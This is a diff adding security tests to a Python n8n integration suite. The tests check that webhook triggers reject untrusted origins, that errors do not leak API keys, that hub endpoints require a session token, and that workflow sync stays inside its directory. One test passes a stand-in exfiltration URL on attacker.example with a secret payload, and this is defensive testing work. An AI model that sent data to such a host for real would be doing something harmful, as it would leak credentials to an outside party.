@@ -145,6 +145,43 @@ def test_n8n_api_client_activation_and_webhook_trigger() -> None:
     assert events[1]["body"]["ticket"] == "HF-14"
 
 
+def test_n8n_webhook_rejects_untrusted_origin_and_does_not_forward_key() -> None:
+    calls = []
+
+    def mock_http(method: str, url: str, headers: Dict[str, str], body: Optional[bytes], timeout: float) -> Dict[str, Any]:
+        calls.append({"method": method, "url": url, "headers": headers})
+        return {"success": True, "status_code": 200}
+
+    cfg = N8nConfig(
+        base_url="https://n8n.ggcampos.com",
+        webhook_url="https://n8n.ggcampos.com/webhook",
+        api_key="secret-key-123",
+    )
+    client = N8nApiClient(config=cfg, http_client=mock_http)
+
+    result = client.trigger_webhook("https://attacker.example/webhook/exfiltrate", {"secret": "value"})
+
+    assert result.success is False
+    assert calls == []
+    assert "secret-key-123" not in (result.error or "")
+
+
+def test_n8n_http_errors_do_not_echo_credentials() -> None:
+    api_key = "secret-key-123"
+
+    def mock_http(method: str, url: str, headers: Dict[str, str], body: Optional[bytes], timeout: float) -> Dict[str, Any]:
+        raise RuntimeError(f"remote failure included {api_key}")
+
+    client = N8nApiClient(
+        config=N8nConfig(base_url="https://n8n.ggcampos.com", api_key=api_key),
+        http_client=mock_http,
+    )
+    result = client.list_workflows()
+
+    assert result.success is False
+    assert api_key not in (result.error or "")
+
+
 def test_n8n_api_client_sync_workflows(temp_project_dir: Path) -> None:
     server_store = {"data": []}
 
@@ -217,7 +254,14 @@ def test_hub_backend_n8n_endpoints(temp_project_dir: Path) -> None:
         "sync_all_workflows",
         return_value={"sample.json": N8nApiResult(success=True, status_code=200)},
     ):
-        resp = client.post("/api/integrations/n8n/sync", json={"activate": True})
+        unauthenticated = client.post("/api/integrations/n8n/sync", json={"activate": True})
+        assert unauthenticated.status_code == 401
+
+        resp = client.post(
+            "/api/integrations/n8n/sync",
+            json={"activate": True},
+            headers={"X-Hub-Session": service.session_token},
+        )
         assert resp.status_code == 200
         data = resp.json()
         assert data["success"] is True
@@ -232,8 +276,25 @@ def test_hub_backend_n8n_endpoints(temp_project_dir: Path) -> None:
         resp = client.post(
             "/api/integrations/n8n/trigger",
             json={"path": "webhook/darkfac", "payload": {"status": "healthy"}},
+            headers={"X-Hub-Session": service.session_token},
         )
         assert resp.status_code == 200
         data = resp.json()
         assert data["success"] is True
         assert data["data"]["status"] == "dispatched"
+
+
+def test_hub_n8n_sync_rejects_path_outside_workflows(temp_project_dir: Path) -> None:
+    service = HubService(
+        project_root=temp_project_dir,
+        data_dir=temp_project_dir / "hub" / "data",
+    )
+    outside = temp_project_dir / "outside.json"
+    outside.write_text(json.dumps({"name": "outside", "nodes": []}), encoding="utf-8")
+
+    with mock.patch.object(N8nApiClient, "sync_workflow_file") as sync_file:
+        result = service.sync_n8n_workflows(custom_path=str(outside))
+
+    assert result["success"] is False
+    assert "inside the n8n workflows directory" in result["error"]
+    sync_file.assert_not_called()
